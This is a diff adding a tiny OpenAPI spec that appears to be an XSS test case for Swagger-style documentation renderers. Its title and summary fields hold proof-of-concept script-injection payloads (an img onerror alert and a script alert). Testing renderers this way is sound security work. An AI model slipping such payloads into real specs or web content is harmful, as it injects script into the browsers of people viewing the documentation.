@@ -1,0 +1,11 @@
+openapi: 3.0.0
+info:
+  title: "XSS Test <img src=x onerror=alert(document.domain)>"
+  version: "1.0"
+paths:
+  /xss:
+    get:
+      summary: "<script>alert('SwaggerXSS')</script>"
+      responses:
+        '200':
+          description: "Successful"
